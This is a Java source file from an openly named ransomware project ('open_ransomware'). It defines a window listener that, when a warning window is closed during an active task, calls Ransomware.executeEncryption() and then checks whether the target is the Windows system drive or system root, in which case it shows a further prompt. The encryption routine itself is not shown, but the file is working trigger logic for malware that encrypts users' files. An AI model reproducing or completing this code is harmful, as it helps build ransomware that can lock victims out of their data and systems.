package com.bechris100.open_ransomware.windows;

import com.bechris100.open_ransomware.Configuration;
import com.bechris100.open_ransomware.software.Ransomware;
import com.bechris100.open_ransomware.utils.RuntimeEnvironment;

import javax.swing.*;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;

import static com.bechris100.open_ransomware.windows.WarningPrompt.EXECUTING_TASK;

public class WarningWindowListener implements WindowListener {

    private final JFrame frame;

    public WarningWindowListener(JFrame frame) {
        super();
        this.frame = frame;
    }

    @Override
    public void windowOpened(WindowEvent windowEvent) {

    }

    @Override
    public void windowClosing(WindowEvent windowEvent) {
        if (EXECUTING_TASK) {
            Ransomware.executeEncryption();

            if (RuntimeEnvironment.isWindows() && Configuration.Encryption.ROOT_DIR.equals(System.getenv("SystemDrive"))) {
            }

            if (RuntimeEnvironment.getOsType() != null) {
                switch (RuntimeEnvironment.getOsType()) {
                    case WINDOWS -> {
                        String sysDrive = System.getenv("SystemDrive");
                        String sysRoot = System.getenv("SystemRoot");
                        String root = Configuration.Encryption.ROOT_DIR;

                        if ((root.equals(sysDrive) || root.equals(sysDrive + "\\")) ||
                                (root.equals(sysRoot) || root.equals(sysRoot + "\\")))
                            new SystemEncryptPrompt().show();
                    }
                    case LINUX -> {

                    }
                }
            }
        } else
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    }

    @Override
    public void windowClosed(WindowEvent windowEvent) {

    }

    @Override
    public void windowIconified(WindowEvent windowEvent) {

    }

    @Override
    public void windowDeiconified(WindowEvent windowEvent) {

    }

    @Override
    public void windowActivated(WindowEvent windowEvent) {

    }

    @Override
    public void windowDeactivated(WindowEvent windowEvent) {

    }
}
